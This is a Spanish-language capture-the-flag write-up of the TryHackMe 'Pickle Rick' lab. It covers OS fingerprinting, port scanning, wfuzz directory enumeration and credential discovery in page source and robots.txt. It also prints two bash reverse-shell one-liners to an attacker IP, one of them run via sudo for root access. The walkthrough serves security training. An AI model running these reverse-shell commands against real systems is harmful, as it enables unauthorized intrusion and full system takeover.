---
title : Maquina [ Pickle Rick ]
published : True
---


<p>Maquina a vulnerar Pickle Rick</p>
> Url : <a href="https://tryhackme.com/room/picklerick"> Pickle Rick </a>
<p></p>

<h2><font color="white"><center># pickleRick</center></font></h2>
<p>Empezaremos viendo a que sistema operativo nos enfrentamos.</p>
<img src="/imgs/pickleRick/pickleRick1.jpg"/>
<p> Vemos que el ttl es de 63 lo cual hace referencia a una maquina Linux, ahora veremos que puertos están abiertos.</p>
<img src="/imgs/pickleRick/pickleRick2.jpg"/>
<p>Puerto 22/ssh y 80/http , ya intente conectarme por ssh pero me arroja permiso denyed, mirando el código del html de el puerto 80, me topo que en el código hay un usuario : <font color="yellow">R1ckRul3s</font></p>
<img src="/imgs/pickleRick/pickleRick3.jpg"/>
<p>Ahora lo que haré sera enumerar directorios activos en la pagina web, con la herramienta <font color="gold">wfuzz</font></p>
> wfuzz -t 200 --hc=404 -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.181.144/FUZZ
<p></p>
<img src="/imgs/pickleRick/pickleRick4.jpg"/>
<p>Vemos que directamente hay un robots.txt el cual al verlo en la pagnia web parece un tipo de contra.</p>
<img src="/imgs/pickleRick/pickleRick5.jpg"/>
<p>Posterior mente me doy cuenta que existe un login.php</p>
<img src="/imgs/pickleRick/pickleRick6.jpg"/>
<p>El cual con el usuario anterior encontrado y la contra me lleva a un panel con ejecución remota de comandos</p>
>/bin/bash -c  "bash -i >& /dev/tcp/10.18.27.215/444 0>&1"
<p></p>
<img src="/imgs/pickleRick/pickleRick7.jpg"/>
<p>Lo cual me aprovecho de la ejecución remota de comando para hacerme una web Shell </p>
<img src="/imgs/pickleRick/pickleRick8.jpg"/>
<p>Posteriormente me doy cuenta que el usuario www-data puede ejecutar cualquier comando</p>
> sudo -l
<p></p>
<img src="/imgs/pickleRick/pickleRick9.jpg"/>
<p>Entonces me hago una reverse Shell con el sudo</p>
> sudo /bin/bash -c "bash -i >& /dev/tcp/10.18.27.215/445 0>&1"
<p></p>
<img src="/imgs/pickleRick/pickleRick10.jpg"/>
<p>Ok maquina <font color="red">Vulnerada</font></p>
